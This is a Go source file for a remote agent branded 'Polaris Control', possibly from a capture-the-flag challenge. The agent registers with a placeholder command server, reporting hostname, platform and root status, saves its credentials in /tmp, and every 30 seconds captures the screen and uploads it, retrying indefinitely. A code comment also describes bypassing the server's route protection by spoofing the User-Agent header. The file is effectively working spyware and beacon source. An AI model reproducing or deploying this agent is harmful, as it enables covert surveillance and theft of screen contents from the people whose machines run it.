package main

import (
	"bytes"
	"encoding/json"
	"image/png"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

type Creds struct {
	ID    string `json:"identifier"`
	Token string `json:"token"`
}

func checkFile(filePath string) bool {
	var result bool

	if _, err := os.Stat(filePath); err == nil {
		if err != nil {
			result = false
		} else {
			result = true
		}
	}

	return result
}

func readFromConfigFile(filePath string) []string {
	var result []string
	data, err := ioutil.ReadFile(filePath)

	if err == nil {
		var fileContents string = string(data)
		result = strings.Split(fileContents, ":")
	} else {
		result = append(result, "invalid")
		result = append(result, "invalid")
	}

	return result
}

func writeToConfigFile(filePath string, id string, token string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	var str = id + ":" + token
	f.WriteString(str)
}

func checkAv() string {
	return "N/A"
}

func getUserType() string {
	currentUser, err := user.Current()
	if err != nil {
		return ""
	}
	if currentUser.Username == "root" {
		return "root"
	}
	return "user"
}

func checkConnection(apiURL string) bool {
	var result bool = false

	client := &http.Client{}
	req, _ := http.NewRequest("GET", apiURL, nil)

	resp, err := client.Do(req)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		}
	}

	return result
}

func registerAgent(apiURL string, version string, userAgent string) []string {
	var registerAgentURL string = apiURL + "/comms/register"
	var result []string

	var userType string = getUserType()
	var antivirus string = checkAv()
	hostname, _ := os.Hostname()
	var platform string = runtime.GOOS
	var arch string = runtime.GOARCH

	requestBody, _ := json.Marshal(map[string]string{
		"version":   version,
		"antivirus": antivirus,
		"hostname":  hostname,
		"platform":  platform,
		"arch":      arch,
		"rights":    userType,
	})

	client := &http.Client{}
	req, _ := http.NewRequest("POST", registerAgentURL, bytes.NewReader(requestBody))

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Creds
			responseBytes, _ := ioutil.ReadAll(resp.Body)
			json.Unmarshal(responseBytes, &decodedJSON)
			result = append(result, decodedJSON.ID)
			result = append(result, decodedJSON.Token)
		}
	}

	return result
}

// #VIEW
// We can bypass the route protection by setting the User-Agent header to the same value as the one used by the agent. It might be a potential SSRF
func checkAgent(apiURL string, id string, token string, userAgent string) bool {
	var result bool = false
	var checkAgentURL string = apiURL + "/comms/check/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", checkAgentURL, nil)
	req.Header.Set("User-Agent", userAgent)

	resp, _ := client.Do(req)

	if resp.StatusCode == 200 {
		result = true
	}

	return result
}

func takeScreenshot(screenshotPath string) {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file, _ := os.Create(screenshotPath)
	defer file.Close()
	png.Encode(file, img)
}

func updateDetails(apiURL string, id string, token string, version string, userAgent string, screenshotPath string) {
	var updateURL string = apiURL + "/comms/update/" + id + "/" + token

	var userType string = getUserType()
	var antivirus string = checkAv()
	hostname, _ := os.Hostname()
	var platform string = runtime.GOOS
	var arch string = runtime.GOARCH

	takeScreenshot(screenshotPath)

	bodyBuf := new(bytes.Buffer)
	writer := multipart.NewWriter(bodyBuf)

	fileWriter, err := writer.CreateFormFile("image", filepath.Base(screenshotPath))
	if err != nil {
		return
	}

	file, err := os.Open(screenshotPath)
	if err != nil {
		return
	}

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		return
	}

	file.Close()

	_ = writer.WriteField("version", version)
	_ = writer.WriteField("antivirus", antivirus)
	_ = writer.WriteField("hostname", hostname)
	_ = writer.WriteField("platform", platform)
	_ = writer.WriteField("arch", arch)
	_ = writer.WriteField("rights", userType)

	err = writer.Close()
	if err != nil {
		return
	}

	client := &http.Client{}
	req, _ := http.NewRequest("POST", updateURL, bodyBuf)

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()
	}
}

func main() {
	const version = "3.12.5"
	const userAgent = "Polaris Control/" + version
	const configPath string = "/tmp/polaris.conf"
	const screenshotPath string = "/tmp/screenshot.png"
	const apiURL string = "SERVER_URL"

	var apiConnection bool = checkConnection(apiURL)

	if apiConnection {
		var configFileExists bool = checkFile(configPath)

		if configFileExists {
			var credidentials []string = readFromConfigFile(configPath)
			var credsValidated = checkAgent(apiURL, credidentials[0], credidentials[1], userAgent)

			if credsValidated {
				updateDetails(apiURL, credidentials[0], credidentials[1], version, userAgent, screenshotPath)

				for range time.NewTicker(30 * time.Second).C {
					updateDetails(apiURL, credidentials[0], credidentials[1], version, userAgent, screenshotPath)
				}
			} else {
				var newCredidentials []string = registerAgent(apiURL, version, userAgent)
				writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
				main()
			}
		} else {
			var newCredidentials []string = registerAgent(apiURL, version, userAgent)
			writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
			main()
		}
	} else {
		time.Sleep(30 * time.Second)
		main()
	}
}
